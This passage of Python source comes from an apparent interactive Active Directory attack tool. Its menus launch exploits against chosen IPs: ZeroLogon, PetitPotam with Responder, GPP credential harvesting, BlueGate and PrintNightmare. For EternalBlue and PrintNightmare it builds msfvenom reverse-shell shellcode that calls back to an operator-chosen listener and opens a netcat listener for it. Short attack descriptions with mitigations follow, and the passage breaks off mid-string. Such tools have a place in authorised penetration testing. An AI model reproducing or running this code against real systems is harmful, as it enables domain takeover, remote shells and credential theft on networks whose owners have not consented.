                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying PetitPotam with nullsession attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr = get_listening_ip()
                interface = get_interface()
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}...{bcolors.ENDC}")
                    print(f"{bcolors.BOLD}Responder will be runt over another terminal, please enter your password on it to run Responder as root (the terminal will sleep 30s waiting for this){bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'sudo python3 {cwd}/SCANNER_AD/Responder/Responder.py -I {interface} --lm; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                    time.sleep(20)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                petitpotam_poc.exploit('', '', domain_name, '', '', ip, 'lsarpc', ip, ip, ip_addr, kerberos=None)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # Attack: PrinterBug (or SpoolSample)
        if option_numero == 7:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/printerbug_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/printerbug_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying PrinterBug attack against {ip}:{port}...{bcolors.ENDC}")
                # python3 printerbug...
                print(f"\n{bcolors.WARNING}NOT IMPLEMENTED FOR NOW{bcolors.ENDC}")
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # Attack: ZeroLogon (or CVE-2020-1472)
        if option_numero == 9:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-zerologon_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-zerologon_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the DCs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                dc_hostname = df.loc[row_chosen, 3]
                print(f"{bcolors.WARNING}Trying ZeroLogon (or CVE-2020-1472) attack against {dc_hostname} (ip: {ip})...{bcolors.ENDC}")
                zerologon_poc.perform_attack(f"'\\\\{dc_hostname}", ip, dc_hostname)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # Attack: GPP abuse without account
        elif option_numero == 10:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the DCs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                dc_hostname = df.loc[row_chosen, 3]
                print(f"{bcolors.WARNING}Trying GPP Abuse attack against {dc_hostname} (ip: {ip})...{bcolors.ENDC}")
                results = getgpp_poc(username='guest', password='', domain=domain_name, target_ip=ip, port=445, lmhash=None, nthash=None, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None)
                if results:
                    file = open(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip_creds.txt", "a+", encoding="utf-8")
                    file.write(results)
                    file.close()
                results = getgpp_poc(username='', password='', domain=domain_name, target_ip=ip, port=445, lmhash=None, nthash=None, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None)
                if results:
                    file = open(f"{cwd}/known-data/vulns/gppabuse-wa_vulns-ip_creds.txt", "a+", encoding="utf-8")
                    file.write(results)
                    file.close()
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # ATTACKING RDG PORTS: 3391
        # Attack: BlueGate (or CVE-2020-0610)
        if option_numero == 11:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-bluegate_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-bluegate_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying BlueGate (or CVE-2020-0610) attack against {ip}:{port}...{bcolors.ENDC}")
                bluegate_poc.exploit_poc(ip, port)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        if option_numero == 12:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return
        print(f"{bcolors.OKBLUE}=> The files are saved into known-data/exploits{bcolors.ENDC}")



def exploiting_vulns_with_domain_account():
    print(f"{bcolors.OKGREEN}\nEntering into [SEARCHING VULNERABILITIES WITH DOMAIN ACCOUNT] menu...{bcolors.ENDC}")
    print(f"{bcolors.BOLD}The known attacks are:{bcolors.ENDC}")
    print(f"{bcolors.OKBLUE}=> EternalBlue, PrintNightmare, MIC Remove attack, PetitPotam, sAMAccountName spoofing, Coerce (PrinterBug, DFSCoerce, etc.){bcolors.ENDC}")
    exploit_vuln_menu_options =  {
        1: "Option 01: Exploiting IP vulnerable to Eternal Blue (or MS17-010) attack    [!!]",
        2: "Option 02: Exploiting IP vulnerable to PrintNightmare attack                [!]",
        3: "Option 03: Exploiting IP vulnerable to MIC Remove attack                    []",
        4: "Option 04: Exploiting IP vulnerable to PetitPotam attack                    []",
        5: "Option 05: Exploiting IP vulnerable to sAMAccountName spoofing attack       [!]",
        6: "Option 06: Exploiting IP vulnerable to GPP Abuse with account attack        []",
        7: "Option 07: Exploiting IP vulnerable to SMB Pipes attacks                    []",
        8: "Option 08: Return to the main menu",
    }

    print("For these attacks, you must use a domain account...")
    df = pandas.read_csv(f"{cwd}/known-data/accounts/dom-users_list.txt",)
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following accounts: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        domain_name = df.loc[row_chosen, 'domain']
        username = df.loc[row_chosen, 'username']
        password = df.loc[row_chosen, 'password']
        ntlm_hash = df.loc[row_chosen, 'NTLM_hash']
        print(f"{bcolors.HEADER}The chosen user : {df.loc[row_chosen, 'domain']}/{df.loc[row_chosen, 'username']} (password: {df.loc[row_chosen, 'password']}, hash: {df.loc[row_chosen, 'NTLM_hash']}).{bcolors.ENDC}")
    else:
        print(f"{bcolors.FAIL}There are no domain users...\n{bcolors.ENDC}")
        return

    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        return

    while True:
        option_numero = print_menu(exploit_vuln_menu_options)

        if password is None and ntlm_hash is None:
            print("The users used doesn't have any password or hashes specified.")
        if pandas.isna(ntlm_hash) or ntlm_hash is None:
            lmhash, nthash = None, None
            ntlm_hash = None
        else:
            lmhash, nthash = ntlm_hash.split(':')

        # ATTACKING SMB PORTS : 445
        # Attack: Eternal Blue (or MS17-010): with eternalblue_ms17010_scanner.py
        if option_numero == 1:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/ms17-010-eternalblue_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying Eternal Blue attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr, lport = get_listening_addr()
                print(f"{bcolors.WARNING}You will be listening onto {ip_addr}:{lport}...{bcolors.ENDC}")
                try:
                    bashCommand = f"msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST={ip_addr} LPORT={lport} -o {cwd}/known-data/exploits/shellcodex64_eternalblue"
                    subprocess.run(bashCommand, shell=True, check=False)
                    bashCommand = f"msfvenom -p windows/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST={ip_addr} LPORT={lport} -o {cwd}/known-data/exploits/shellcodex86_eternalblue"
                    subprocess.run(bashCommand, shell=True, check=False)
                    eternalblue_poc.merge_shellcode(f"{cwd}/known-data/exploits/shellcodex64_eternalblue", f"{cwd}/known-data/exploits/shellcodex86_eternalblue", f"{cwd}/known-data/exploits/shellcodeall_eternalblue")
                except Exception:
                    print(f"{bcolors.WARNING}The shellcode were not successfully created with MSFVenom....{bcolors.ENDC}")
                    break
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}:{lport}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'netcat -lvnp {lport}; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                eternalblue_poc.exploit(ip, f"{cwd}/known-data/exploits/shellcodeall_eternalblue", 13, username, password)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # Attack: PrintNightmare (or CVE-2021-1675) with eternalblue_cve20211675_scanner.py
        elif option_numero == 2:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-printnightmare_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-printnightmare_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying PrintNightmare (or CVE-2021-1675) attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr, lport = get_listening_addr()
                print(f"{bcolors.WARNING}You will be listening onto {ip_addr}:{lport}...{bcolors.ENDC}")
                try:
                    bashCommand = f"msfvenom -p windows_reverse_tcp_shell LHOST={ip_addr} -f dll -o {cwd}/known-data/exploits/shellcode_printnightmare.dll"
                    subprocess.run(bashCommand, shell=True, check=False)
                    bashCommand = f"x86_64-w64-mingw32-gcc -shared -o {cwd}/known-data/exploits/shellcode_printnightmare {cwd}/known-data/exploits/shellcode_printnightmare.c"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The shellcode were not successfully created with MSFVenom....{bcolors.ENDC}")
                    break
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}:{lport}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'netcat -lvnp {lport}; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                printnightmare_poc.exploit(username, password, lmhash, nthash, domain_name, f"{cwd}/known-data/exploits/shellcode_printnightmare.c", ip, port, proto="MS-RPRN", pDriverPath=None, timeout=5)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # Attack: MIC Remove attack (or CVE-2019-1040) with micRA_cve20191040_scanner.py
        elif option_numero == 3:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/micRA_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/micRA_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying MIC Remove attack (or CVE-2019-1040) against {ip}:{port}...{bcolors.ENDC}")
                ip_addr = get_listening_ip()
                print(f"\n{bcolors.WARNING}NOT IMPLEMENTED FOR NOW{bcolors.ENDC}")
                return
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # Attack: PetitPotam with session attack
        elif option_numero == 4:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/petitpotam_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/petitpotam_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying PetitPotam attack against {ip}:{port}...{bcolors.ENDC}")
                ip_addr = get_listening_ip()
                interface = get_interface()
                try:
                    print(f"{bcolors.BOLD}Opening new terminal with listening session onto {ip_addr}...{bcolors.ENDC}")
                    bashCommand = f"gnome-terminal -- sh -c 'sudo python3 {cwd}/SCANNER_AD/Responder/Responder.py -I {interface} --lm; exec bash'"
                    subprocess.run(bashCommand, shell=True, check=False)
                except Exception:
                    print(f"{bcolors.WARNING}The listening session was not successfully opened due to {Exception}...{bcolors.ENDC}")
                    break
                petitpotam_poc.exploit(username, password, domain_name, lmhash, nthash, ip, 'lsarpc', ip, ip, ip_addr, kerberos=None)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")


        # ATTACKING DOMAIN CONTROLLERS
        # Attack: sAMAccountName spoofing attack (or CVE-2021-42XX) with sAMAccountName_cve20214227_scanner.py
        if option_numero == 5:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the DCs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                dc_hostname = df.loc[row_chosen, 3]
                print(f"{bcolors.WARNING}Trying sAMAccountName spoofing attack (or CVE-2021-42XX) attack against {dc_hostname} (ip: {ip})...{bcolors.ENDC}")
                samaccountname_poc.exploit_sAMANS(username, password, ntlm_hash, domain_name, ip, ip, dc_hostname, k=None, aesKey=None, no_tls=True, no_pass=None)
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        # Attack: GPP Abuse
        elif option_numero == 6:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/gppabuse_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/gppabuse_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the DCs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                dc_hostname = df.loc[row_chosen, 3]
                print(f"{bcolors.WARNING}Trying GPP Abuse attack against {dc_hostname} (ip: {ip})...{bcolors.ENDC}")
                results = getgpp_poc(username=username, password=password, domain=domain_name, target_ip=ip, port=445, lmhash=None, nthash=None, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None)
                if results:
                    file = open(f"{cwd}/known-data/vulns/gppabuse_vulns-ip_creds.txt", "a+", encoding="utf-8")
                    file.write(results)
                    file.close()
            else:
                print(f"{bcolors.WARNING}No vulnerable IP found into your file in known-data/vulns{bcolors.ENDC}")

        if option_numero == 8:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return
        print(f"{bcolors.OKBLUE}=> The files are saved into known-data/exploits{bcolors.ENDC}")


def exploiting_vulns_with_local_account():
    print(f"{bcolors.OKGREEN}\nEntering into [EXPLOITING VULNERABILITIES WITH LOCAL ACCOUNT] menu...{bcolors.ENDC}")
    print(f"{bcolors.BOLD}The known attacks are:{bcolors.ENDC}")
    print(f"{bcolors.OKBLUE}=> HiveNightmare{bcolors.ENDC}")
    exploit_vuln_menu_options =  {
        1: "Option 01: Exploiting IP vulnerable to HiveNightmare attack    [!!]",
        2: "Option 02: Return to the main menu",
    }
    print("For these attacks, you must use a local account...")
    df = pandas.read_csv(f"{cwd}/known-data/accounts/local-users_list.txt",)
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following accounts: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        username = df.loc[row_chosen, 'username']
        password = df.loc[row_chosen, 'password']
        ntlm_hash = df.loc[row_chosen, 'NTLM_hash']
        print(f"{bcolors.HEADER}The chosen user : {df.loc[row_chosen, 'username']} (password: {df.loc[row_chosen, 'password']}, hash: {df.loc[row_chosen, 'NTLM_hash']}).{bcolors.ENDC}")
    else:
        print(f"{bcolors.FAIL}There are no local users...\n{bcolors.ENDC}")
        return

    df = pandas.read_csv(f"{cwd}/known-data/accounts/domain-infos_list.txt")
    if not df.empty:
        print(f"\n{bcolors.BOLD}Choose among the following domains: {bcolors.ENDC}")
        print(df.to_markdown(index=True))
        row_chosen = get_int_val(0, len(df)-1)
        fqdn = df.loc[row_chosen, 'fqdn']
        domain_name = df.loc[row_chosen, 'domain']
        tld = df.loc[row_chosen, 'tld']
        print(f"{bcolors.HEADER}The chosen domain : {df.loc[row_chosen, 'domain']} (fqdn: {df.loc[row_chosen, 'fqdn']}, tld: {df.loc[row_chosen, 'tld']}).{bcolors.ENDC}")
    else:
        print("You should run the option 1 to get the domain name or write it into the file: domain-infos_list.txt.")
        return

    while True:
        option_numero = print_menu(exploit_vuln_menu_options)

        if password is None and ntlm_hash is None:
            print("The users used doesn't have any password or hashes specified.")
        if pandas.isna(ntlm_hash) or ntlm_hash is None:
            lmhash, nthash = None, None
            ntlm_hash = None
        else:
            lmhash, nthash = ntlm_hash.split(':')

        # ATTACKING SMB PORTS : 445
        # Attack: Eternal Blue (or MS17-010): with eternalblue_ms17010_scanner.py
        if option_numero == 1:
            df = pandas.read_csv(f"{cwd}/known-data/vulns/hivenightmare_vulns-ip", header=None) if os.path.isfile(f"{cwd}/known-data/vulns/hivenightmare_vulns-ip") else pandas.DataFrame()
            df = df.loc[df[2] == True] if not df.empty else pandas.DataFrame()
            if not df.empty:
                print(f"\n{bcolors.BOLD}Choose among the IPs to exploit: {bcolors.ENDC}")
                print(df.to_markdown(index=True))
                row_chosen = get_int_val(0, len(df)-1)
                ip = df.loc[row_chosen, 0]
                port = df.loc[row_chosen, 1]
                print(f"{bcolors.WARNING}Trying HiveNightmare attack against {ip}:{port}...{bcolors.ENDC}")
                print(f"\n{bcolors.WARNING}NOT IMPLEMENTED FOR NOW{bcolors.ENDC}")
                return
        if option_numero == 2:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return

        print(f"{bcolors.OKBLUE}=> The files are saved into known-data/exploits{bcolors.ENDC}")
    print("Return to the menu (as it is not implemented)...")

def exploiting_vulns_with_local_adm_account():
    print(f"{bcolors.OKGREEN}\nEntering into [EXPLOITING VULNERABILITIES WITH LOCAL ADM ACCOUNT] menu...{bcolors.ENDC}")
    print("Return to the menu (as it is not implemented)...")

def exploiting_vulns():
    print(f"{bcolors.OKGREEN}\nEntering into [EXPLOITING VULNERABILITIES] menu...{bcolors.ENDC}")
    scan_vuln_menu_options = {
		1: "Option 1: Exploiting without any accounts",
		2: "Option 2: Exploiting with a domain account (with low privs)",
		3: "Option 3: Exploiting with a local account (with low privs)",
		4: "Option 4: Exploiting with a local account (with high privs)",
		5: "Option 5: Return to the main menu.",
    }
    while True:
        option_numero = print_menu(scan_vuln_menu_options)
        if option_numero == 1:
            exploiting_vulns_without_account()
        elif option_numero == 2:
            exploiting_vulns_with_domain_account()
        elif option_numero == 3:
            exploiting_vulns_with_local_account()
        elif option_numero == 4:
            exploiting_vulns_with_local_adm_account()
        elif option_numero == 5:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return

############################################################################################################################
########## => GET VALUE
############################################################################################################################
def modify_infos_aio(filename, target, action):
    if os.path.isfile(filename):
        df = pandas.read_csv(filename, sep=",")
    else:
        print("The file doesn't exist.")
        return 
    print(f"\n{bcolors.BOLD}The current list of {target} are: {bcolors.ENDC}")
    print(df.to_markdown(index=True))
    if action == "ADD":
        print(f"\n{bcolors.WARNING}To add a {target}, you must conform to the following format:{bcolors.ENDC}")
        columns_val = {}
        for column_name in df.columns:
            val = input(f"Enter the {column_name}: ")
            columns_val[column_name] = val
        if list(columns_val.values())[0] not in df.values and list(columns_val.values())[0] != "":
            file = open(filename, "a")
            file.write("\n")
            for val in list(columns_val.values())[:-1]:
                file.write(f"{val},")
            file.write(f"{list(columns_val.values())[-1]}")
            file.close()
            print(f"{bcolors.HEADER}The {target}: {columns_val} has been added.{bcolors.ENDC}\n")
        else:
            print(f"{bcolors.HEADER}The {target}: {columns_val} is already in the list.{bcolors.ENDC}\n")
    elif action == "DELETE":
        if not df.empty:
            row_del = get_int_val(0, len(df)-1)
            updated_df = df.drop(row_del)
            updated_df.to_csv(filename, index=None, sep=',')
            print(f"{bcolors.HEADER}The {target}: {df.loc[row_del]} has been deleted.{bcolors.ENDC}\n")       
        else:
            print(f"{bcolors.HEADER}There are no {target} in the list.{bcolors.ENDC}\n")
    print(f"{bcolors.OKBLUE}=> The files are saved into known-data/accounts{bcolors.ENDC}")


def add_infos():
    print(f"{bcolors.OKGREEN}\nEntering into [ADDING INFOS] menu...{bcolors.ENDC}")
    infos_menu_options = {
        1: "Option 1: Add informations",
        2: "Option 2: Remove informations",
        3: "Option 3: Return to the main menu."
    }
    while True:
        option = print_menu(infos_menu_options)
        if option == 1:
            option_action = "ADD"
        elif option == 2:
            option_action = "DELETE"
        else:
            print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
            return
        print(f"\n{bcolors.OKGREEN}We will {option_action} information...{bcolors.ENDC}")
        addinfos_menu_options = {
            1: f"Option 1: {option_action} a local user",
            2: f"Option 2: {option_action} a local administrator user",
            3: f"Option 3: {option_action} a domain user",
            4: f"Option 4: {option_action} domain infos",
            5: f"Option 5: {option_action} a Domain Controller (DC)",
            6: "Option 6: Return to the previous menu",
            7: "Option 7: Return to the main menu"
        }
        while True:
            option = print_menu(addinfos_menu_options)
            if option == 1:
                modify_infos_aio(f"{cwd}/known-data/accounts/local-users_list.txt", "local user", option_action)
            elif option == 2:
                modify_infos_aio(f"{cwd}/known-data/accounts/local-adm-users_list.txt", "local administrator user", option_action)
            elif option == 3:
                modify_infos_aio(f"{cwd}/known-data/accounts/dom-users_list.txt", "domain user", option_action)
            elif option == 4: 
                modify_infos_aio(f"{cwd}/known-data/accounts/domain-infos_list.txt", "domain infos", option_action)
            elif option == 5:
                modify_infos_aio(f"{cwd}/known-data/accounts/domain-controllers_list.txt", "domain controller", option_action)
            elif option == 6:
                break
            elif option == 7:
                print(f"\n{bcolors.OKGREEN}Returning to the main menu...{bcolors.ENDC}")
                return


############################################################################################################################
########## => INFORMATIONS
############################################################################################################################

def show_details_attacks():
    list_attacks_options =  {
        1:  "Option 01: Show details about SMBGhost attack",
        2:  "Option 02: Show details about SMBleed attack",
        3:  "Option 03: Show details about Eternal Blue (or MS17-010) attack",
        4:  "Option 04: Show details about Netapi (or MS08-067) attack",
        5:  "Option 05: Show details about PetitPotam",
        6:  "Option 06: Show details about SMB Signing attack",
        7:  "Option 07: Show details about PrinterBug (or SpoolSample) attack",
        8:  "Option 08: Show details about MS14-068 (Kerberos Checksum attack) attack",
        9:  "Option 09: Show details about ZeroLogon attack",
        10: "Option 10: Show details about GPP abuse attack",
        11: "Option 11: Show details about BlueGate attack",
        12: "Option 12: Show details about PrintNightmare attack",
        13: "Option 13: Show details about MIC Remove (or Drop The Mic) attack",
        14: "Option 14: Show details about sAMAccountName spoofing attack",
        15: "Option 15: Show details about SMB Pipes attacks",
        16: "Option 16: Return to the main menu"
    }
    while True:
        option_numero = print_menu(list_attacks_options)
        # SMBGhost
        if option_numero == 1:
            print(f"{bcolors.UNDERLINE}SMBGhost attack description:{bcolors.ENDC} It exploits the way SMB protocol handles the decompresison of client-supplied data (quite similar to SMBleed).\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Vulnerable Windows versions with the patches not applied\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        to do: \n \
        # 1) Find the offset depending on the Windows version targeted. It is where the payload will be injected. \n \
        # 2) Overriding OriginalCompressedSegmentSize or Offset field  \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}\n \
        - Apply the security patches (ex: KB4560960, KB4557957)\n \
        - Disable SMBv3 Server compression feature\n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://blog.zecops.com/research/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/ \
                ")

        # SMBleed
        elif option_numero == 2:
            print(f"{bcolors.UNDERLINE}SMBleed attack description:{bcolors.ENDC} It exploits the way SMB protocol handles the decompresison of client-supplied data (quite similar to SMBGhost).\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Vulnerable Windows versions with the patches not applied\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} ?\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        to do: \n\
        # 1) Find the offset depending on the Windows version targeted. It is where the payload will be injected. \n \
        # 2) Overriding OriginalCompressedSegmentSize or Offset field  \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}\n \
        - Apply the security patches (ex: KB4560960, KB4557957)\n \
        - Disable SMBv3 Server compression feature\n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
    - https://blog.zecops.com/research/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/ \
                ")

        # Eternal Blue (or MS17-010)
        elif option_numero == 3:
            print(f"{bcolors.UNDERLINE}EternalBlue attack description:{bcolors.ENDC} The attack exploits how Microsoft Windows handles the crafted packets, it only requires to send a maliciously-crafted packet to the target server, then the malware will propagate.\n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Workstations with SMBv1 enabled (and not the patch applied), most cases are the Windows Server 2008 and 2012 R2\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} Could crash the workstations\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Create a buffer overflow into protocol communication for casting OS/2 File Extended Attribute (FEA)\n \
        2) Trigger the buffer overflow \n \
        2) to do \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}Apply the security patch MS17-010.\n \
            ")

        # Netapi (or MS08-067)
        elif option_numero == 4:
            print(f"{bcolors.UNDERLINE}Netapi attack description:{bcolors.ENDC} Over the RPC protocol, an attacker can trigger a buffler overflow to gain access to the system. \n \
    {bcolors.UNDERLINE}Target(s):{bcolors.ENDC} Workstations (most cases are: Windows 2000, Windows XP, Windows Server 2003)\n \
    {bcolors.UNDERLINE}Risky:{bcolors.ENDC} Could crash the workstations - very risky\n \
    {bcolors.UNDERLINE}Exploit steps:{bcolors.ENDC}\n \
        1) Return to the 64-bit address for 2nd gadge \n \
        2) Prepare RAX for next call, RCX for stack pivot and RDX for final call \n \
        3) Dereference pivot destination pointed to by RCX and call RDX \n \
        4) Final Stack Pivot \n \
    {bcolors.UNDERLINE}Mitigations:{bcolors.ENDC}Apply the security patch MS08-067.\n \
{bcolors.UNDERLINE}Links:{bcolors.ENDC} \n \
